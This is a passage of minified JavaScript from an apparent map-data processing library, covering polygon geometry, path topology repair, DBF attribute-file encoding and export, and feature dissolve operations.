t+(e-n)*(r-t)/(i-n)},_t.getPointToShapeDistance=function(e,t,n,r){var i=(n||[]).reduce(function(n,i){var o=_t.getPointToPathDistance(e,t,i,r);return Math.min(n,o)},1/0);return i},_t.testPointInRing=function(e,t,n,r){var i=!1,o=!1;return It.forEachPathSegment(n,r,function(n,r,a,s){var u=_t.testRayIntersection(e,t,a[n],s[n],a[r],s[r]);1==u?i=!i:isNaN(u)&&(o=!0)}),o?-1:i?1:0},_t.testRayIntersection=function(e,t,n,r,i,o){var a=_t.getRayIntersection(e,t,n,r,i,o);return a!=a?NaN:a==-(1/0)?0:1},_t.getRayIntersection=function(e,t,n,r,i,o){var a,s=-(1/0);return n>e&&i>e||e>n&&e>i||t>r&&t>o||(e===n||e===i?e===n&&e===i?(t==r||t==o||t>r!=t>o)&&(s=NaN):e===n?t===r?s=NaN:n>i&&r>t&&(s=r):t===o?s=NaN:i>n&&o>t&&(s=o):(a=_t.getYIntercept(e,n,r,i,o),a>t?s=a:a==t&&(s=NaN))),s},_t.getSphericalPathArea=function(e,t){for(var n,r,i,o,a=t.getShapeIter(e),s=0,u=!1,l=Math.PI/180;a.hasNext();)n=a.x*l,r=Math.sin(a.y*l),u?s+=(n-i)*(2+r+o):u=!0,i=n,o=r;return s/2*6378137*6378137},_t.getPlanarPathArea2=function(e){for(var t,n,r,i,o,a,s,u=0,l=0,c=e.length;c>l;l++)s=e[l],0===l?(t=0,n=0,o=-s[0],a=-s[1]):(t=s[0]+o,n=s[1]+a,u+=t*i-r*n),r=t,i=n;return u/2},_t.getPlanarPathArea=function(e,t){var n,r,i,o,a,s,u=t.getShapeIter(e),l=0;if(u.hasNext())for(n=0,r=0,a=-u.x,s=-u.y;u.hasNext();)i=n,o=r,n=u.x+a,r=u.y+s,l+=n*o-i*r;return l/2},_t.countVerticesInPath=function(e,t){for(var n=t.getShapeIter(e),r=0;n.hasNext();)r++;return r},_t.getPathBounds=function(e){for(var n=new t,r=0,i=e.length;i>r;r++)n.mergePoint(e[r][0],e[r][1]);return n},_t.transposePoints=function(e){for(var t=[],n=[],r=e.length,i=0;r>i;i++)t.push(e[i][0]),n.push(e[i][1]);return[t,n]},_t.calcPathLen=function(){function e(e,n,r,i){t+=h(r[e],i[e],r[n],i[n])}var t;return function(n,r){t=0;for(var i=0,o=n.length;o>i;i++)r.forEachArcSegment(n[i],e);return t}}(),It.findNodeTopology=function(e,t){var n=2*e.size(),r=new Float64Array(n),i=new Float64Array(n),o=new Int32Array(n);e.forEach2(function(e,n,a,s,u,l){if(!t||t(l)){var c=e,f=e+n-1,p=2*l,d=p+1;r[p]=a[c],i[p]=s[c],o[p]=l,r[d]=a[f],i[d]=s[f],o[d]=l}});var a=me(r,i);return{xx:r,yy:i,ids:o,chains:a}},It.getSelfIntersectionSplitter=function(e){function t(e,t){for(var n=0,r=e.length;r>n;n++)if(e[n]===t)return!0;return!1}function n(n,i){var o,a,s=0,u=null;return e.forEachConnectedArc(i,function(e){var r=~e;t(n,r)&&(0===s?a=r:1===s?o=[a,r]:o.push(r),s++)}),o?(u=It.splitPathByIds(n,o),u.reduce(function(e,t){return e.concat(r(t))},[])):null}function r(e){for(var t=null,r=0;r<e.length-1;r++)if(t=n(e,e[r]))return t;return It.removeSpikesInPath(e),e.length>0?[e]:[]}return r},It.splitPathByIds=function(e,t){var n=t.length,r=t.map(function(t){var n=e.indexOf(t);return-1==n&&i("[splitPathByIds()] Path is missing id:",t),n});yt.genericSort(r,!0);var o=r.map(function(t,i){var o;return o=i==n-1?e.slice(0,r[0]).concat(e.slice(t)):e.slice(t,r[i+1])});return 0!==r[0]&&o.unshift(o.pop()),o[0][0]!==e[0]&&i("[splitPathByIds()] Indexing error"),o},It.setBits=function(e,t,n){return e&~n|t&n},It.andBits=function(e,t,n){return e&(~n|t)},It.setRouteBits=function(e,t,n){var r,i=c(t);i==t?r=-4:(r=-49,e<<=4),n[i]&=e|r},It.getRouteBits=function(e,t){var n=c(e),r=t[n];return n!=e&&(r>>=4),7&r},It.openArcRoutes=function(e,t,n,r,i,o,a){It.forEachArcId(e,function(e){var s=0>e,u=s?~e:e,c=n[u],f=s?i:r,p=s?r:i,d=c;t.arcIsLollipop(e)?(l("lollipop"),d=0):(f&&(d|=3),p&&(d|=48),a>0&&(d|=a),o&&34===(34&d)&&(d&=-18)),n[u]=d})},It.closeArcRoutes=function(e,t,n,r,i,o){It.forEachArcId(e,function(e){var t=0>e,a=t?~e:e,s=n[a],u=255,l=t?i:r,c=t?r:i;l&&(o&&(u&=-2),u^=2),c&&(o&&(u&=-17),u^=32),n[a]=s&u})},It.getPathFinder=function(e,t,n,r,o){function a(t){var o=u.indexOfVertex(t,-2),a=f[o],c=p[o],h=u.indexOfVertex(t,-1),g=f[h],m=p[h],y=NaN,v=0;return e.forEachConnectedArc(t,function(o){if(n(~o)){u.getArcLength(o)<2&&i("[pathfinder] defective arc");var h,x=u.indexOfVertex(o,-2),b=f[x],S=p[x],P=u.indexOfVertex(o,-1),w=f[P],I=p[P];if((w!==g||I!==m)&&(s("cd:",b,S,w,I,"arc:",o),i("Error in node topology")),h=d(a,c,g,m,b,S),h>0)if(0===v)y=o,v=h;else{var A=r(~y,v,~o,h,t);2==A&&(y=o,v=h)}else l("#getNextArc() Invalid angle; id:",o,"angle:",h),e.debugNode(t)}}),y===t&&(e.debugNode(t),i("#getNextArc() nextId === prevId")),~y}var u=e.arcs,c=u.getVertexData(),f=c.xx,p=c.yy,d=o?_t.signedAngleSph:_t.signedAngle;return function(e){var n,r,i=[],o=e,c=!1;do{if(c&&(r=(void 0===n?" ":"	"+n)+" -> "+o),!t(o))return c&&s(r+" x"),null;if(i.push(o),n=o,c&&s(r),o=a(n),c&&o==e&&s("	o",_t.getPlanarPathArea(i,u)),o==~n)return l("dead-end"),null}while(o!=e);return 0===i.length?null:i}},It.getRingIntersector=function(e,t,n,r){function i(e,t,n,r,i){var o=1;return t==r?l("[chooseRoute()] parallel routes, unsure which to choose"):t>r&&(o=2),o}function o(e){var t=It.getRouteBits(e,n);return 1==(1&t)}function a(e){var t=It.getRouteBits(e,n),r=!1;return 3==t&&(r=!0,It.setRouteBits(1,e,n)),r}var s=e.arcs,u=It.getPathFinder(e,a,o,i,r);return n=n||new Uint8Array(s.size()),function(e){var r,i="dissolve"==t,o=!0,a="flatten"==t;return e.length>0?(r=[],It.openArcRoutes(e,s,n,o,a,i),It.forEachPath(e,function(e){for(var t,n=0,i=e.length;i>n;n++)t=u(e[n]),t&&r.push(t)}),It.closeArcRoutes(e,s,n,o,a,!0)):r=e,r}},It.debugFlags=function(e){function t(e){for(var t="",n=0;8>n;n++)t+=(e&1<<n)>0?"1":"0",7>n&&(t+=" "),3==n&&(t+=" ");return t}var n=[];yt.forEach(e,function(e){n.push(t(e))}),s(n)},It.getHoleDivider=function(e,t){var n=It.getSelfIntersectionSplitter(e);return function(r,i,o){var a=t?_t.getSphericalPathArea:_t.getPlanarPathArea;It.forEachPath(r,function(t){var r=n(t);0===r.length&&l("[getRingDivider()] Defective path:",t),r.forEach(function(t,n){var r=a(t,e.arcs);r>0?i.push(t):0>r&&o.push(t)})})}},It.cleanShapes=function(e,t,n){for(var r=0,i=e.length;i>r;r++)e[r]=It.cleanShape(e[r],t,n)},It.cleanShape=function(e,t,n){return It.editPaths(e,function(e){var r=It.cleanPath(e,t);return"polygon"==n&&r&&(It.removeSpikesInPath(r),0===_t.getPlanarPathArea(r,t)&&(r=null)),r})},It.cleanPath=function(e,t){for(var n=0,r=0,i=e.length;i>r;r++)t.arcIsDegenerate(e[r])&&(n++,e[r]=null);return n>0?e.filter(function(e){return null!==e}):e},It.removeSpikesInPath=function(e){var t=e.length;if(t>=2){if(e[0]==~e[t-1])e.pop(),e.shift();else for(var n=1;t>n;n++)if(e[n-1]==~e[n]){e.splice(n-1,2);break}e.length<t&&It.removeSpikesInPath(e)}},It.repairPolygonGeometry=function(e,t,n){var r=It.divideArcs(t);return e.forEach(function(e){It.repairSelfIntersections(e,r)}),e},It.repairSelfIntersections=function(e,t){function n(e){var n=[];return It.forEachPath(e,function(e){var o=r(e);if(0===o.length)i("[cleanPolygon()] Defective path:",e);else if(1==o.length)n.push(o[0]);else{var a,s=_t.getPlanarPathArea(e,t.arcs),u=s>0?1:-1;o.reduce(function(e,n,r){var i=_t.getPlanarPathArea(n,t.arcs)*u;return i>e&&(a=n,e=i),e},0);a&&n.push(a)}}),n.length>0?n:null}var r=It.getSelfIntersectionSplitter(t);e.shapes=e.shapes.map(function(e,t){return n(e)})},It.divideArcs=function(e){var t=e.arcs;bt.start(),bt.start();var n=It.getHighPrecisionSnapInterval(t),r=It.snapCoordsByInterval(t,n),i=t.dedupCoords();bt.stop("snap points"),(r>0||i>0)&&(bt.start(),wt.buildTopology(e),bt.stop("rebuild topology")),bt.start();var o=It.insertClippingPoints(t);bt.stop("insert clipping points"),bt.start();var a=new ee(t);return e.layers.forEach(function(e){It.layerHasPaths(e)&&(It.updateArcIds(e.shapes,o,a),It.cleanShapes(e.shapes,t,e.geometry_type))}),bt.stop("update arc ids / clean geometry"),bt.stop("divide arcs"),a},It.updateArcIds=function(e,t,n){function r(e){if(e){for(var t=[],n=0;n<e.length;n++)i(e[n],t);o.push(t)}}function i(e,r){var i,o=0>e,s=o?~e:e,u=t[s],l=(s>=t.length-1?a:t[s+1])-1;do o?(i=~l,l--):(i=u,u++),n&&(i=n.findMatchingArc(i)),r.push(i);while(l-u>=0)}for(var o,a=n.arcs.size(),s=0;s<e.length;s++)o=[],It.forEachPath(e[s],r),e[s]=o},It.insertClippingPoints=function(e){var t,n,r,o,a=It.findClippingPoints(e),s=e.getPointCount(),u=e.size(),l=e.getVertexData(),c=l.xx,f=l.yy,p=l.nn,d=0,h=s+2*a.length,g=new Float64Array(h),m=new Float64Array(h),y=[],v=0,x=new Uint32Array(u);a.sort(function(e,t){return t.i-e.i||t.pct-e.pct}),t=a.pop();for(var b=0,S=0;u>b;b++){for(r=p[b],x[b]=S,n=0,o=0;r>n;){for(o++,g[v]=c[d],m[v++]=f[d];t&&t.i===d;)g[v]=t.x,m[v++]=t.y,o++,y[S++]=o,o=0,g[v]=t.x,m[v++]=t.y,o++,t=a.pop();n++,d++}y[S++]=o}return v!=h&&i("[insertClippingPoints()] Counting error"),e.updateVertexData(y,g,m,null),e.dedupCoords(),x},It.findClippingPoints=function(e){function t(e,t,n){var r,s=n[0],c=n[1],f=o[c]-o[s],p=a[c]-a[s];return s>c&&i("[findClippingPoints()] Out-of-sequence arc ids"),r=0===f&&0===p?0:Math.abs(p)>Math.abs(f)?(t-a[s])/p:(e-o[s])/f,(0>r||r>1)&&(u("[findClippingPoints()] Off-segment intersection (caused by rounding error"),l("pct:",r,"dx:",f,"dy:",p,"x:",e,"y:",t,"xx[i]:",o[s],"xx[j]:",o[c],"yy[i]:",a[s],"yy[j]:",a[c]),l("xpct:",(e-o[s])/f,"ypct:",(t-a[s])/p),0>r&&(r=0),r>1&&(r=1)),{pct:r,i:s,j:c,x:e,y:t}}var n=It.findSegmentIntersections(e),r=e.getVertexData(),o=r.xx,a=r.yy,s=[];n.forEach(function(e){var n=t(e.x,e.y,e.a),r=t(e.x,e.y,e.b);n&&s.push(n),r&&s.push(r)});var c={};return s.filter(function(t){var n=t.i+","+t.pct;return n in c?!1:(c[n]=!0,t.pct<=0&&e.pointIsEndpoint(t.i)||t.pct>=1&&e.pointIsEndpoint(t.j)?!1:!0)})},It.getEncodings=function(){var e=STtwUtilBuffer.iconv;return e.encodingExists("ascii"),Object.keys(e.encodings)},It.validateEncoding=function(e){return It.encodingIsSupported(e)||o("Unknown encoding:",e,"\nRun the -encodings command see a list of supported encodings"),e},It.encodingIsSupported=function(e){var t=It.standardizeEncodingName(e);return yt.contains(It.getEncodings(),t)},It.decodeString=function(e,t){var n=STtwUtilBuffer.iconv,r=n.decode(e,t);return 65279==r.charCodeAt(0)&&(r=r.substr(1)),r},It.standardizeEncodingName=function(e){return e.toLowerCase().replace(/[_-]/g,"")},It.printEncodings=function(){var e=It.getEncodings().filter(function(e){return!/^(_|cs|internal|ibm|isoir|singlebyte|table|[0-9]|l[0-9]|windows)/.test(e)});e.sort(),s("Supported encodings:"),s(It.formatStringsAsGrid(e))},It.detectEncoding=function(e){var t=null;return It.looksLikeUtf8(e)?t="utf8":It.looksLikeWin1252(e)&&(t="win1252"),t},It.decodeSamples=function(e,t){return t.map(function(t){return It.decodeString(t,e).trim()}).join("\n")},It.formatSamples=function(e){return It.formatStringsAsGrid(e.split("\n"))},It.looksLikeWin1252=function(e){var t="abcdefghijklmnopqrstuvwxyz0123456789.'\"?+-\n,:;/|_$% ",n="ßàáâãäåæçèéêëìíîïðñòóôõöøùúûüýÿ°–",r=It.decodeSamples("win1252",e),i=It.getCharScore(r,t),o=It.getCharScore(r,n+t);return o>.97&&i>.7},It.looksLikeUtf8=function(e){var t=It.decodeSamples("utf8",e);return-1==t.indexOf("�")},It.getCharScore=function(e,t){var n={},r=0;e=e.toLowerCase();for(var i=0,o=t.length;o>i;i++)n[t[i]]=1;for(i=0,o=e.length;o>i;i++)r+=n[e[i]]||0;return r/e.length},It.getValueType=function(e){var t=null;return yt.isString(e)?t="string":yt.isNumber(e)?t="number":yt.isBoolean(e)?t="boolean":yt.isObject(e)&&(t="object"),t},It.getColumnType=function(e,t){for(var n,r=null,i=t.getRecords(),o=0,a=t.size();a>o&&(n=i[o]||{},!(r=It.getValueType(n[e])));o++);return r},It.deleteFields=function(e,t){e.getFields().forEach(function(n){t(n)&&e.deleteField(n)})},It.isInvalidFieldName=function(e){return/^\s*$/.test(e)},It.getUniqFieldNames=function(e,t){var n={};return e.map(function(e){var r,i=0;do r=It.adjustFieldName(e,t,i),i++;while(r in n);return n[r]=!0,r})},It.adjustFieldName=function(e,t,n){var r,i;return t=t||256,n?(i=String(n),1==i.length&&(i="_"+i),r=e.substr(0,t-i.length)+i):r=e.substr(0,t),r};var Et={};Et.languageIds=[1,"437",2,"850",3,"1252",8,"865",9,"437",10,"850",11,"437",13,"437",14,"850",15,"437",16,"850",17,"437",18,"850",19,"932",20,"850",21,"437",22,"850",23,"865",24,"437",25,"437",26,"850",27,"437",28,"863",29,"850",31,"852",34,"852",35,"852",36,"860",37,"850",38,"866",55,"850",64,"852",77,"936",78,"949",79,"950",80,"874",87,"1252",88,"1252",89,"1252",100,"852",101,"866",102,"865",103,"861",106,"737",107,"857",108,"863",120,"950",121,"949",122,"936",123,"932",124,"874",134,"737",135,"852",136,"857",200,"1250",201,"1251",202,"1254",203,"1253",204,"1257"],Et.encodingNames={932:"Japanese",936:"Simplified Chinese",950:"Traditional Chinese",1252:"Western European",949:"Korean",874:"Thai",1250:"Eastern European",1251:"Russian",1254:"Turkish",1253:"Greek",1257:"Baltic"},Et.ENCODING_PROMPT='To avoid corrupted text, re-import using the "encoding=" option.\nTo see a list of supported encodings, run the "encodings" command.',Et.lookupCodePage=function(e){var t=Et.languageIds.indexOf(e);return-1==t?null:Et.languageIds[t+1]},Et.readAsciiString=function(e,t){var n=xt.inNode,r=e.readCString(t,n);return null===r&&o("DBF file contains non-ascii text.\n"+Et.ENCODING_PROMPT),yt.trim(r)},Et.readStringBytes=function(e,t,n){for(var r,i=0,o=0;t>o&&(r=e.readUint8(),0!==r);o++)(i>0||32!=r)&&(n[i++]=r);for(;i>0&&32==n[i-1];)i--;return i},Et.getAsciiStringReader=function(){var e=new Uint8Array(256);return function(t,n){for(var r="",i=Et.readStringBytes(t,n,e),o=0;i>o;o++)r+=String.fromCharCode(e[o]);return r}},Et.getEncodedStringReader=function(e){var t=new Buffer(256),n="utf8"==It.standardizeEncodingName(e);return function(r,i){var o,a=Et.readStringBytes(r,i,t);return o=0===a?"":n?t.toString("utf8",0,a):It.decodeString(t.slice(0,a),e)}},Et.getStringReader=function(e){return e&&"ascii"!==e?xt.inNode?Et.getEncodedStringReader(e):void i("[Dbf.getStringReader()] Non-ascii encodings only supported in Node."):Et.getAsciiStringReader()},Et.bufferContainsHighBit=function(e,t){for(var n=0;t>n;n++)if(e[n]>=128)return!0;return!1},Et.getNumberReader=function(){var e=Et.getAsciiStringReader();return function(t,n){var r,i=e(t,n);return i.indexOf(",")>=0&&(i=i.replace(",",".")),r=parseFloat(i),isNaN(r)?null:r}},Et.readInt=function(e,t){return e.readInt32()},Et.readBool=function(e,t){var n=e.readCString(t),r=null;return/[ty]/i.test(n)?r=!0:/[fn]/i.test(n)&&(r=!1),r},Et.readDate=function(e,t){var n=e.readCString(t),r=n.substr(0,4),i=n.substr(4,2),o=n.substr(6,2);return new Date(Date.UTC(+r,+i-1,+o))},Et.MAX_STRING_LEN=254,Et.exportRecords=function(e,t){t=t||"ascii";var r=Et.getFieldNames(e),o=It.getUniqFieldNames(r,10),a=e.length,s=r.map(function(n){return Et.getFieldInfo(e,n,t)}),u=Et.getHeaderSize(s.length),l=Et.getRecordSize(yt.pluck(s,"size")),c=u+a*l+1,f=new ArrayBuffer(c),p=new n(f).littleEndian(),d=new Date;return p.writeUint8(3),p.writeUint8(d.getFullYear()-1900),p.writeUint8(d.getMonth()+1),p.writeUint8(d.getDate()),p.writeUint32(a),p.writeUint16(u),p.writeUint16(l),p.skipBytes(17),p.writeUint8(0),p.skipBytes(2),s.reduce(function(e,t,n){var r=o[n];return p.writeCString(r,11),p.writeUint8(t.type.charCodeAt(0)),p.writeUint32(e),p.writeUint8(t.size),p.writeUint8(t.decimals),p.skipBytes(14),e+t.size},1),p.writeUint8(13),p.position()!=u&&i("Dbf#exportRecords() header size mismatch; expected:",u,"written:",p.position()),e.forEach(function(e,t){var n=p.position();p.writeUint8(32);for(var r=0,o=s.length;o>r;r++)s[r].write(t,p);p.position()-n!=l&&i("#exportRecords() Error exporting record:",e)}),p.writeUint8(26),p.position()!=c&&i("Dbf#exportRecords() file size mismatch; expected:",c,"written:",p.position()),f},Et.getFieldNames=function(e){if(!e||!e.length)return[];var t=Object.keys(e[0]);return t.sort(),t},Et.getHeaderSize=function(e){return 33+32*e},Et.getRecordSize=function(e){return yt.sum(e)+1},Et.initNumericField=function(e,t,n){var r,o=18;data=this.getNumericFieldInfo(t,n),e.decimals=data.decimals,r=Math.max(data.max.toFixed(e.decimals).length,data.min.toFixed(e.decimals).length),r>o&&(r=o,e.decimals-=r-o,e.decimals<0&&i("Dbf#getFieldInfo() Out-of-range error.")),e.size=r;var a=Et.getDecimalFormatter(r,e.decimals);e.write=function(e,i){var o=t[e],s=a(o[n]);s.length<r&&(s=yt.lpad(s,r," ")),i.writeString(s,r)}},Et.initBooleanField=function(e,t,n){e.size=1,e.write=function(e,r){var i,o=t[e][n];i=o===!0?"T":o===!1?"F":"?",r.writeString(i)}},Et.initDateField=function(e,t,n){e.size=8,e.write=function(e,r){var i,o=t[e][n];i=o instanceof Date==!1?"00000000":yt.lpad(o.getUTCFullYear(),4,"0")+yt.lpad(o.getUTCMonth()+1,2,"0")+yt.lpad(o.getUTCDate(),2,"0"),r.writeString(i)}},Et.initStringField=function(e,t,n,r){var i=Et.getStringWriter(r),o=0,a=t.map(function(e){var t=i(e[n]);return o=Math.max(o,t.byteLength),t});e.size=o,e.write=function(e,t){var n=a[e],r=Math.min(o,n.byteLength),i=t.position();t.writeBuffer(n,r,0),t.position(i+o)}},Et.getFieldInfo=function(e,t,n){var r=this.discoverFieldType(e,t),i={name:t,type:r,decimals:0};return"N"==r?Et.initNumericField(i,e,t):"C"==r?Et.initStringField(i,e,t,n):"L"==r?Et.initBooleanField(i,e,t):"D"==r?Et.initDateField(i,e,t):(i.size=0,i.type="N",i.write=function(){}),i},Et.discoverFieldType=function(e,t){for(var n,r=0,i=e.length;i>r;r++){if(n=e[r][t],yt.isString(n))return"C";if(yt.isNumber(n))return"N";if(yt.isBoolean(n))return"L";if(n instanceof Date)return"D"}return null},Et.getDecimalFormatter=function(e,t){var n=" ";return function(r){var i=yt.isFiniteNumber(r),o=i?r.toFixed(t):String(n);return yt.lpad(o,e," ")}},Et.getNumericFieldInfo=function(e,t){for(var n,r,i=0,o=15,a=1/0,s=-(1/0),u=1,l=0,c=e.length;c>l;l++)if(n=e[l][t],yt.isFiniteNumber(n)){for(r=0,a>n&&(a=n),n>s&&(s=n);n*u%1!==0&&r!=o;)r++,u*=10;r>i&&(i=r)}return{decimals:i,min:a,max:s}},Et.getStringWriter=function(e){return"ascii"===e?Et.getStringWriterAscii():Et.getStringWriterEncoded(e)},Et.getStringWriterAscii=function(){return function(e){for(var t=String(e),n=Math.min(t.length,Et.MAX_STRING_LEN),r=new ArrayBuffer(n),i=new Uint8ClampedArray(r),o=0;n>o;o++)i[o]=t.charCodeAt(o);return r}},Et.getStringWriterEncoded=function(e){var t=STtwUtilBuffer.iconv;return function(r){var i=t.encode(r,e);return i.length>=Et.MAX_STRING_LEN&&(i=Et.truncateEncodedString(i,e,Et.MAX_STRING_LEN)),n.toArrayBuffer(i)}},Et.truncateEncodedString=function(e,t,n){for(var r,i,o=e.slice(0,n),a=n;a>0&&a>=n-3;){if(r=a==n?o:e.slice(0,a),i=It.decodeString(r,t),"�"!=i.charAt(i.length-1)){o=r;break}a--}return o};var Mt=/^[a-zA-Z_][a-zA-Z_0-9]*$/,Ct={fieldExists:function(e){return yt.contains(this.getFields(),e)},exportAsJSON:function(){return JSON.stringify(this.getRecords())},addField:function(e,t){var n=yt.isFunction(t);yt.isNumber(t)||yt.isString(t)||n||i("DataTable#addField() requires a string, number or function for initialization"),this.fieldExists(e)&&i("DataTable#addField() tried to add a field that already exists:",e),Mt.test(e)||i("DataTable#addField() invalid field name:",e),this.getRecords().forEach(function(r,i){r[e]=n?t(r,i):t})},addIdField:function(){this.addField("FID",function(e,t){return t})},deleteField:function(e){this.getRecords().forEach(function(t){delete t[e]})},getFields:function(){var e=this.getRecords(),t=e[0];return t?Object.keys(t):[]},update:function(e){for(var t=this.getRecords(),n=0,r=t.length;r>n;n++)t[n]=e(t[n],n)},clone:function(){var e=this.getRecords().map(function(e){return yt.extend({},e)});return new ne(e)},size:function(){return this.getRecords().length}};yt.extend(ne.prototype,Ct),It.getCategoryClassifier=function(e,t){if(!e)return function(e){return 0};t&&t.fieldExists(e)||o("[dissolve] Data table is missing field:",e);var n={},r=0,i=t.getRecords();return function(t){var o=String(i[t][e]);return o in n==!1&&(n[o]=r++),n[o]}},It.aggregateDataRecords=function(e,t,n){var r=[],i=n.sum_fields||[],o=n.copy_fields||[];return n.field&&o.push(n.field),e.forEach(function(e,n){if(e){var a,s=t(n);s in r?a=r[s]:(r[s]=a={},o.forEach(function(t){a[t]=e[t]})),i.forEach(function(t){a[t]=(e[t]||0)+(a[t]||0)})}}),r},It.simplifyArcsFast=function(e,t){for(var n,r=[],i=[],o=[],a=0,s=e.size();s>a;a++)n=It.simplifyPathFast([a],e,t,r,i),1==n&&(n=0,r.pop(),i.pop()),o.push(n);return new Z(o,r,i)},It.simplifyPolygonFast=function(e,t,n){if(!e||!n)return null;var r=[],i=[],o=[],a=[];return e.forEach(function(e){for(var s=It.simplifyPathFast(e,t,n,r,i);4>s&&s>0;)r.pop(),i.pop(),s--;s>0&&(a.push([o.length]),o.push(s))}),{shape:a.length>0?a:null,arcs:new Z(o,r,i)}},It.simplifyPathFast=function(e,t,n,r,i){for(var o,a,s,u,l=t.getShapeIter(e),c=0;l.hasNext();)s=l.x,u=l.y,(0===c||h(s,u,o,a)>n)&&(r.push(s),i.push(u),o=s,a=u,c++);return(s!=o||u!=a)&&(r.push(s),i.push(u),c++),c},_t.getShapeCentroid=function(e,t){var n=_t.getMaxPath(e,t);return n?_t.getPathCentroid(n,t):null},_t.getPathCentroid=function(e,t){var n,r,i,o,a=t.getShapeIter(e),s=0,u=0,l=0;if(!a.hasNext())return null;for(n=a.x,r=a.y;a.hasNext();)i=n*a.y-r*a.x,s+=i,u+=i*(a.x+n),l+=i*(a.y+r),n=a.x,r=a.y;return o=s/2,0===o?_t.getAvgPathXY(e,t):{x:u/(6*o),y:l/(6*o)}},_t.findInteriorPoint=function(e,t){var n,r,i=e&&_t.getMaxPath(e,t),o=i&&t.getSimpleShapeBounds(i);return o&&o.hasBounds()&&0!==o.area()?(n=.01*Math.sqrt(o.area()),r=It.simplifyPolygonFast(e,t,n),r.shape?_t.findInteriorPoint2(r.shape,r.arcs):null):null},_t.findInteriorPoint2=function(e,t){var n,r,i,o,a,s,l,c,f=_t.getMaxPath(e,t),p=t.getSimpleShapeBounds(f),d=_t.getPathCentroid(f,t),h=It.getPointWeightingFunction(d,p),g=_t.getPlanarPathArea(f,t);return 1==e.length&&1.2*g>p.area()?(a=5,o=.2):1==e.length&&1.7*g>p.area()?(a=7,o=.4):(a=11,o=.5),n=p.width()*o,r=d.x-n/2,i=r+n,s=n/a,l=It.probeForBestInteriorPoint(e,t,r,i,a,h),l?(c=It.probeForBestInteriorPoint(e,t,l.x-s/2,l.x+s/2,2,h),c.distance>l.distance&&(l=c)):(u("[points inner] failed, falling back to centroid"),l=d),l},It.getPointWeightingFunction=function(e,t){var n=Math.max(t.width(),t.height())/2;return function(t,r){var i=h(e.x,e.y,t,r);return 1-Math.min(.6*i/n,.25)}},It.findInteriorPointCandidates=function(e,t,n){var r=t.getBounds().ymin-1;return n.reduce(function(n,i){var o=It.findHitCandidates(i,r,e,t);return n.concat(o)},[])},It.probeForBestInteriorPoint=function(e,t,n,r,i,o){var a,s,u,l=It.getInnerTics(n,r,i),c=(r-n)/i,f=It.findInteriorPointCandidates(e,t,l);f.forEach(function(e){e.interval*=o(e.x,e.y)}),f.sort(function(e,t){return t.interval-e.interval});for(var p=0;p<f.length&&(u=f[p],!(a&&a.distance>u.interval));p++)s=It.getAdjustedPoint(u.x,u.y,e,t,c,o),(!a||s.distance>a.distance)&&(a=s);return a},It.getAdjustedPoint=function(e,t,n,r,i,o){var a={x:e,y:t,distance:_t.getPointToShapeDistance(e,t,n,r)*o(e,t)};return It.scanForBetterPoint(a,n,r,i,o),It.scanForBetterPoint(a,n,r,-i,o),a},It.scanForBetterPoint=function(e,t,n,r,i){for(var o,a=e.x,s=e.y,u=e.distance;;){if(s+=r,o=_t.getPointToShapeDistance(a,s,t,n)*i(a,s),!(o>.9*u&&_t.testPointInPolygon(a,s,t,n)))break;o>u&&(e.distance=u=o,e.y=s)}},It.findHitCandidates=function(e,t,n,r){var i,o,a,s=It.findRayShapeIntersections(e,t,n,r),u=[];yt.genericSort(s);for(var l=0;l<s.length;l+=2)i=s[l],o=s[l+1],a=(o-i)/2,a>0&&u.push({y:(i+o)/2,x:e,interval:a});return u},It.findRayShapeIntersections=function(e,t,n,r){return n?n.reduce(function(n,i){var o=It.findRayRingIntersections(e,t,i,r);return n.concat(o)},[]):[]},It.findRayRingIntersections=function(e,t,n,r){var i=[];return It.forEachPathSegment(n,r,function(n,r,o,a){var s=_t.getRayIntersection(e,t,o[n],a[n],o[r],a[r]);s>-(1/0)&&i.push(s)}),i.length%2===1&&(i=[]),i},It.getInnerTics=function(e,t,n){for(var r=t-e,i=r/(n+1),o=[],a=1;n>=a;a++)o.push(e+i*a);return o},It.compileValueExpression=function(e,t,n){return It.compileFeatureExpression(e,t,n,!0)},It.compileFeatureExpression=function(e,t,n,r){var i,o,a=e||"",s=It.getAssignedVars(a);return s.length>0&&!t.data&&It.initDataTable(t),o=t.data?t.data.getRecords():[],i=It.getExpressionFunction(a,t,n,r),function(e){var t=o[e];t||(t=o[e]={});for(var n=0;n<s.length;n++)s[n]in t==!1&&(t[s[n]]=null);return i(t,e)}},It.getAssignedVars=function(e){var t=/[A-Za-z_][A-Za-z0-9_]*(?= *=[^=])/g;return e.match(t)||[]},It.getExpressionFunction=function(e,t,n,r){var i,a=It.getExpressionContext(t,n),s=(r?"return ":"")+e;try{i=new Function("record,env","with(env){with(record){ "+s+"}}")}catch(u){o(u.name,"in expression ["+e+"]")}return function(t,n){var r;a.$.__setId(n);try{r=i.call(null,t,a)}catch(s){o(s.name,"in expression ["+e+"]:",s.message)}return r}},It.getExpressionContext=function(e,t){var n=It.getBaseContext();return e.data&&e.data.getFields().forEach(function(e){n[e]=null}),n.$=new ie(e,t),n},It.getBaseContext=function(){var e={};return function(){for(var t in this)e[t]=null}(),e.console=console,e},wt.dissolve=function(e,t,n){var r,i=n||{},a=It.getCategoryClassifier(i.field,e.data),s=null,u=null;if("polygon"==e.geometry_type?s=se(e.shapes,a):"point"==e.geometry_type?s=oe(e,a,i):e.geometry_type&&o("[dissolve] Only point and polygon geometries can be dissolved"),e.data){u=It.aggregateDataRecords(e.data.getRecords(),a,i);for(var l=0,c=u.length;c>l;l++)s&&!s[l]&&(s[l]=null)}return r={name:i.no_replace?null:e.name,shapes:s,data:u?new ne(u):null,geometry_type:e.geometry_type},i.silent||It.printDissolveMessage(e,r),r},It.printDissolveMessage=function(e,t,n){var r=It.getFeatureCount(e),i=It.getFeatureCount(t),o=yt.format("[%s] Dissolved %,d feature%s into %,d feature%s",n||"dissolve",r,yt.pluralSuffix(r),i,yt.pluralSuffix(i));s(o)},wt.dissolve2=function(e,t,n){It.requirePolygonLayer(e,"[dissolve2] Expected a polygon type layer");var r=It.divideArcs(t);return It.dissolvePolygonLayer(e,r,n)},It.dissolvePolygonLayer=function(e,t,n){n=n||{};var r,i,o=It.getCategoryClassifier(n.field,e.data),a=e.shapes.reduce(function(e,t,n){var r=o(n);return r in e==!1&&(e[r]=[]),It.extendShape(e[r],t),e},[]),s=It.getPolygonDissolver(t);return bt.start(),e.data&&(i=new 